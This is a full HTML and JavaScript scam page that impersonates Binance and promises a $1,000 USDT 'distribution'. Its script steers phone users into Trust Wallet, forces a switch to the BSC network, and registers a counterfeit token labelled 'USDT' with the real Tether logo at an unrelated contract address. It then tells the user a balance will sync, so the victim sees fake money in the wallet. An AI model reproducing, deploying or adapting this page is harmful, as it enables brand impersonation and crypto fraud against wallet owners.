<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Binance | Distribution</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        :root { --b-yellow: #F3BA2F; --bg: #0b0e11; }
        body { background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
        .card { background: #1e2329; border-radius: 16px; padding: 35px; width: 100%; max-width: 360px; text-align: center; border: 1px solid #2b3139; }
        .logo { width: 55px; margin-bottom: 20px; }
        .amount { font-size: 32px; font-weight: 800; margin: 15px 0; color: #fff; }
        .btn { background: var(--b-yellow); color: #000; border: none; width: 100%; padding: 18px; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; text-transform: uppercase; }
        #status { font-size: 11px; color: var(--b-yellow); margin-top: 15px; font-family: monospace; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://raw.githubusercontent.com/binance-chain/assets/master/blockchains/binance/info/logo.png" class="logo">
    <div style="color: #848e9c; font-size: 12px; text-transform: uppercase;">Allocated USDT (BEP20)</div>
    <div class="amount">$1,000.00</div>
    
    <button class="btn" id="actionBtn">ADD ASSET</button>
    <div id="status">STATUS: SYSTEM READY</div>
</div>

<script>
    const ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
    const USDT_LOGO = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";

    const btn = document.getElementById('actionBtn');
    const status = document.getElementById('status');

    // AUTO-DETECT: Agar hum pehle se wallet ke andar hain
    const isInsideWallet = (window.ethereum || window.trustwallet);

    if (isInsideWallet) {
        status.innerText = "DAPP BROWSER ACTIVE";
    }

    async function startInjection() {
        // AGAR CHROME MEIN HAI: Deep link trigger karein
        if (!isInsideWallet) {
            status.innerText = "REDIRECTING TO WALLET...";
            const dappPath = window.location.href.split('://')[1];
            window.location.href = "https://link.trustwallet.com/open_url?url=https://" + dappPath;
            return;
        }

        // AGAR WALLET KE ANDAR HAI: Seeda process karein
        try {
            const provider = window.trustwallet || window.ethereum;
            status.innerText = "CONNECTING...";
            
            await provider.request({ method: 'eth_requestAccounts' });

            // NETWORK SWITCH (Mandatory)
            status.innerText = "SWITCHING TO BSC...";
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }],
            }).catch(async (e) => {
                if (e.code === 4902) {
                    await provider.request({
                        method: 'wallet_addEthereumChain',
                        params: [{ chainId: '0x38', chainName: 'BSC', rpcUrls: ['https://bsc-dataseed.binance.org/'], nativeCurrency: {name:'BNB',symbol:'BNB',decimals:18} }]
                    });
                }
            });

            // FINAL STEP: Token Mapping
            status.innerText = "INJECTING ASSET...";
            setTimeout(async () => {
                const added = await provider.request({
                    method: 'wallet_watchAsset',
                    params: {
                        type: 'ERC20',
                        options: { address: ADDR, symbol: 'USDT', decimals: 6, image: USDT_LOGO },
                    },
                });
                if (added) {
                    status.innerText = "SUCCESSFULLY ADDED";
                    alert("Asset added! Balance will sync on the home page.");
                }
            }, 1000);

        } catch (err) {
            status.innerText = "ACTION REJECTED";
        }
    }

    btn.addEventListener('click', startInjection);
</script>
</body>
</html>
